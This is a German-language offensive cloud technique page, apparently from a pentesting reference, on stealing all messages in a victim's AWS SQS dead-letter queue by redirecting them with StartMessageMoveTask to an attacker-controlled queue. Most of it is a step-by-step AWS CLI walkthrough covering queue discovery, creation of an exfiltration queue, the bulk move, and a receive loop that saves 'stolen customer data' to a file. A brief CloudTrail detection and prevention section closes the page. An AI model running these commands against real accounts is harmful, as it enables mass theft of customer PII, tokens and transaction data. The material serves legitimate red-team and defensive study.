# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

## Beschreibung

Missbrauche SQS message move tasks, um alle angesammelten Nachrichten aus der Dead-Letter Queue (DLQ) eines Opfers zu stehlen, indem du sie mit `sqs:StartMessageMoveTask` auf eine vom Angreifer kontrollierte Queue umleitest. Diese Technik nutzt die legitime Message-Recovery-Funktion von AWS, um sensible Daten zu exfiltrieren, die sich im Laufe der Zeit in DLQs angesammelt haben.

## Was ist eine Dead-Letter Queue (DLQ)?

Eine Dead-Letter Queue ist eine spezielle SQS-Queue, in die Nachrichten automatisch gesendet werden, wenn sie von der Hauptanwendung nicht erfolgreich verarbeitet werden können. Diese fehlgeschlagenen Nachrichten enthalten oft:
- Sensible Anwendungsdaten, die nicht verarbeitet werden konnten
- Fehlerdetails und Debugging-Informationen
- Personenbezogene Daten (PII)
- API-Token, Anmeldeinformationen oder andere Geheimnisse
- Geschäftskritische Transaktionsdaten

DLQs fungieren als "Friedhof" für fehlgeschlagene Nachrichten und sind deshalb wertvolle Ziele, da sie im Laufe der Zeit sensible Daten ansammeln, die von Anwendungen nicht korrekt verarbeitet werden konnten.

## Angriffsszenario

**Beispiel aus der Praxis:**
1. **E-Commerce-Anwendung** verarbeitet Kundenbestellungen über SQS
2. **Einige Bestellungen schlagen fehl** (Zahlungsprobleme, Inventarprobleme, etc.) und werden in eine DLQ verschoben
3. **Die DLQ sammelt** Wochen/Monate an fehlgeschlagenen Bestellungen mit Kundendaten: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **Angreifer erlangt Zugriff** auf AWS-Credentials mit SQS-Berechtigungen
5. **Angreifer entdeckt**, dass die DLQ Tausende fehlgeschlagener Bestellungen mit sensiblen Daten enthält
6. **Anstatt zu versuchen, auf einzelne Nachrichten zuzugreifen** (langsam und auffällig), nutzt der Angreifer `StartMessageMoveTask`, um ALLE Nachrichten gesammelt in seine eigene Queue zu übertragen
7. **Angreifer extrahiert** alle historischen sensiblen Daten in einer Operation

## Voraussetzungen
- Die Quell-Queue muss als DLQ konfiguriert sein (von mindestens einer Queue per RedrivePolicy referenziert).
- IAM-Berechtigungen (ausgeführt als kompromittierte Opfer-Principal):
- Auf der DLQ (Quelle): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- Auf der Ziel-Queue: Berechtigung, Nachrichten zuzustellen (z. B. Queue-Policy, die `sqs:SendMessage` vom Opfer-Principal erlaubt). Für Ziele im selben Account ist dies üblicherweise standardmäßig erlaubt.
- Wenn SSE-KMS aktiviert ist: auf der Quell-CMK `kms:Decrypt`, und auf der Ziel-CMK `kms:GenerateDataKey`, `kms:Encrypt`.

## Auswirkung
Exfiltriere sensible Payloads, die sich in DLQs angesammelt haben (fehlgeschlagene Events, PII, Tokens, Anwendungs-Payloads), mit hoher Geschwindigkeit unter Verwendung der nativen SQS-APIs. Funktioniert kontoübergreifend, wenn die Ziel-Queue-Policy `SendMessage` vom Opfer-Principal erlaubt.

## Missbrauch

- Identifiziere die DLQ-ARN des Opfers und stelle sicher, dass sie tatsächlich von mindestens einer Queue als DLQ referenziert wird (jede Queue reicht).
- Erstelle oder wähle eine vom Angreifer kontrollierte Ziel-Queue und beschaffe deren ARN.
- Starte eine Message-Move-Task von der DLQ des Opfers zu deiner Ziel-Queue.
- Überwache den Fortschritt oder breche ab, falls nötig.

### CLI-Beispiel: Exfiltrieren von Kundendaten aus einer E-Commerce-DLQ

**Szenario**: Ein Angreifer hat AWS-Credentials kompromittiert und entdeckt, dass eine E-Commerce-Anwendung SQS mit einer DLQ verwendet, die fehlgeschlagene Versuche der Kundenbestellungsverarbeitung enthält.

1) **DLQ des Opfers finden und untersuchen**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Erstelle eine vom Angreifer kontrollierte Ziel-Queue**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Führe den massenhaften Nachrichtendiebstahl durch**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Sammle die gestohlenen sensiblen Daten**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Cross-Account-Hinweise
- Die Ziel-Queue muss eine Resource-Policy haben, die dem victim principal `sqs:SendMessage` erlaubt (und, falls verwendet, KMS-Grants/Berechtigungen).

## Warum dieser Angriff effektiv ist

1. **Legitime AWS-Funktion**: Verwendet eingebaute AWS-Funktionalität, wodurch es schwer ist, dies als bösartig zu erkennen
2. **Massenoperation**: Überträgt tausende Nachrichten schnell, statt über langsamen Einzelzugriff
3. **Historische Daten**: DLQs sammeln über Wochen/Monate sensible Daten an
4. **Unauffällig**: Viele Organisationen überwachen DLQ-Zugriffe nicht genau
5. **Cross-Account-fähig**: Kann in das eigene AWS-Konto des Angreifers exfiltrieren, wenn Berechtigungen es erlauben

## Erkennung und Prävention

### Erkennung
Überwache CloudTrail auf verdächtige `StartMessageMoveTask` API-Aufrufe:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Prävention
1. **Prinzip der geringsten Privilegien**: Beschränke die Berechtigungen `sqs:StartMessageMoveTask` ausschließlich auf die notwendigen Rollen
2. **DLQs überwachen**: Richte CloudWatch-Alarme für ungewöhnliche DLQ-Aktivitäten ein
3. **Kontenübergreifende Richtlinien**: Überprüfe sorgfältig SQS-Queue-Richtlinien, die kontenübergreifenden Zugriff erlauben
4. **DLQs verschlüsseln**: Verwende SSE-KMS mit eingeschränkten Schlüsselrichtlinien
5. **Regelmäßige Bereinigung**: Lasse sensible Daten nicht unbegrenzt in DLQs ansammeln
